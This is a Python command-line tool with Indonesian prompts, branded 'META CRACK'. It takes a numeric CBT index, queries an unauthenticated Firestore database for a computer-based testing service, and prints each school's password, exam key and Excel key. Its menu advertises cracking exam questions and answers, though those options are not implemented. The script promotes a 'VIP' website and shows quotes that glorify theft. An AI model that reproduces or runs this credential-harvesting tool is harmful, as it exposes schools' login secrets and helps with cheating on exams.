#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys, requests, datetime, random, shutil
from rich.console import Console
from rich.panel import Panel as Nel

WR = random.choice(['\x1b[1;97m','\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m'])

class MAIN:

    def __init__(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.Me()
        self.prompt_cbtindex()

    def MyRich(self, Text, chos=None, title=None):
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        Console(width=terminal_width).print(
            Nel(Text,
                subtitle='┌─' if chos else None,
                subtitle_align='left' if chos else None,
                border_style="yellow",
                title=title
            )
        )

    def Me(self, show_quote=True):
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        ascii_art = '''\
 __  ________________     ________  ___  _______ __
/  |/  / __/_  __/ _ |   / ___/ _ \/ _ |/ ___/ //_/
/ /|_/ / _/  / / / __ |  / /__/ , _/ __ / /__/ ,<   
/_/  /_/___/ /_/ /_/ |_|  \___/_/|_/_/ |_\___/_/|_|   
'''

        centered_art = '\n'.join(f"[red]{line.center(terminal_width)}[/red]" for line in ascii_art.splitlines())
        author_text = f"[yellow]{'Script by ziurzk'.center(terminal_width)}[/yellow]"

        promo_raw = "Join VIP visit www.linecatos.com".center(terminal_width)
        promo_raw = promo_raw.replace("www.linecatos.com", "[bold]www.linecatos.com[/bold]")
        promo_text = f"[red]{promo_raw}[/red]"

        warning_text = f"[yellow]{'Please use this tool responsibly. The creator takes no responsibility for any misuse or consequences that may happen.'.center(terminal_width)}\n" \
                       f"{'Don’t do anything shady or weird with it. Hope you understand – keep it clean and smart.'.center(terminal_width)}[/yellow]"

        full_text = f"{centered_art}\n\n{author_text}\n{promo_text}\n\n{warning_text}"
        self.MyRich(full_text)

        if show_quote:
            quotes = [
                ("The world was never fair to women like me — so I made my own rules.", "Zara"),
                ("Kindness is just a costume. Beneath it, money speaks the loudest.", "Zara"),
                ("I don’t steal. I reclaim a world that once stole everything from me.", "Zara"),
                ("They call me ruthless. But they forget—when a man is ruthless, they call him a leader.", "Zara"),
                ("Everyone has a price. The real question is: who’s smart enough to pay before the collapse begins?", "Zara")
            ]
            quote, by = random.choice(quotes)
            quote_text = f"[white]“{quote}”[/white]\n[yellow]{('- ' + by).rjust(terminal_width)}[/yellow]"
            self.MyRich(quote_text, chos=True)

    def prompt_cbtindex(self):
        try:
            Console(style="bold yellow").print("\n[!] Masukkan Kode CBT Index untuk melanjutkan")
            cbtindex = input("└──> Kode CBT Index: ").strip()

            if not cbtindex.isdigit():
                Console(style="bold red").print("[!] Kode harus berupa angka!")
                sys.exit(1)

            self.fetch_firestore(cbtindex)

        except KeyboardInterrupt:
            Console(style="bold red").print("\n[!] Dibatalkan oleh pengguna.")
            sys.exit(0)

    def fetch_firestore(self, cbtindex):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')  # ✅ Bersihkan layar sebelum tampil data

            url = f"https://firestore.googleapis.com/v1/projects/cbt02-890c6/databases/(default)/documents/{cbtindex}"
            res = requests.get(url)

            if res.status_code != 200:
                raise Exception(f"Status HTTP {res.status_code} - CBT Index tidak ditemukan.")

            data = res.json()

            if "documents" not in data:
                raise Exception("CBT Index tidak ditemukan atau tidak memiliki dokumen.")

            doc = data['documents'][0]
            fields = doc.get('fields', {})
            pentest = fields.get('pentest', {}).get('mapValue', {}).get('fields', {})

            self.usr = cbtindex
            self.nama = pentest.get('namasekolah', {}).get('stringValue', '-')
            self.pw = fields.get('password', {}).get('stringValue', '-')
            self.fol = pentest.get('excelkey', {}).get('stringValue', '-')
            self.examkey = pentest.get('examkey', {}).get('stringValue', '-')
            self.tz = pentest.get('timezone', {}).get('stringValue', '-')
            self.ct = doc.get('createTime', '-')
            self.ut = doc.get('updateTime', '-')
            self.ds_user = cbtindex

            self.Me(show_quote=False)  # ✅ Banner saja tanpa quotes

            self.MyRich(f'''[white]
 >> CBTINDEX         : {self.usr}
 >> Nama Sekolah     : {self.nama}
 >> Password         : {self.pw}
 >> Excel Key        : {self.fol}
 >> Exam Key         : {self.examkey}
 >> Timezone         : {self.tz}
 >> Create Time      : {self.ct}
 >> Update Time      : {self.ut}
 >> User ID          : {self.ds_user}
''', None, '[white]> [green]USER DETAILS[/] <')

            self.MyRich(''' [white]
 01. Crack Soal       03. Crack Jawaban
 02. Change CBTINDEX  04. Coming Soon
''', True)

            self.menu_opsi()

        except Exception as e:
            Console(style="bold red").print(f"[!] Gagal mengambil data: {e}")
            sys.exit(1)

    def menu_opsi(self):
        while True:
            try:
                opsi = input("\n[?] Pilih menu (01/02/03/04 atau q untuk keluar): ").strip().lower()

                if opsi in ['01', '1']:
                    Console(style="bold green").print("[✔] Crack Soal belum tersedia.")
                elif opsi in ['02', '2']:
                    self.prompt_cbtindex()
                    break  # keluar dari loop agar fresh CBTIndex
                elif opsi in ['03', '3']:
                    Console(style="bold green").print("[✔] Crack Jawaban belum tersedia.")
                elif opsi in ['04', '4']:
                    Console(style="bold yellow").print("[!] Coming Soon.")
                elif opsi in ['q', 'quit', 'exit']:
                    Console(style="bold red").print("[!] Keluar dari program.")
                    sys.exit(0)
                else:
                    Console(style="bold red").print("[!] Pilihan tidak dikenali, coba lagi.")

            except KeyboardInterrupt:
                Console(style="bold red").print("\n[!] Dibatalkan oleh pengguna.")
                sys.exit(0)


if __name__ == "__main__":
    try:
        MAIN()
    except Exception as err:
        Console(style="bold red").print(f"[!] Terjadi kesalahan: {err}")
